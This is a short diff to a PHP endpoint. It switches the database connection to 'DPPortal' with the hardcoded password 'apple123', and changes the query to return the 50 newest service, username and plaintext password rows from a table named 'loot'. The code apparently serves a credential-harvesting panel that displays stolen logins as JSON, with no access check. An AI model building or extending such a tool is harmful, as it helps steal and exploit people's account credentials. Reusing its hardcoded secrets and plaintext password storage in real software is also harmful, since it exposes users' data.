@@ -4,9 +4,9 @@ header('Content-Type: application/json');
 
 // Database connection configuration
 $host = 'localhost';
-$dbname = 'login_tracker';
-$username = 'root';
-$password = '';
+$dbname = 'DPPortal';
+$username = 'dpuser';
+$password = 'apple123';
 
 try {
     // Create PDO connection
@@ -14,7 +14,7 @@ try {
     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     // Query to get the latest login data
-    $stmt = $pdo->query("SELECT service, username, password, DATE_FORMAT(timestamp, '%Y-%m-%d %H:%i:%s') as timestamp FROM logins ORDER BY timestamp DESC LIMIT 50");
+    $stmt = $pdo->query("SELECT id, service, username, password, datetimestamp FROM loot ORDER BY id DESC LIMIT 50");
     $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
     // Return JSON response
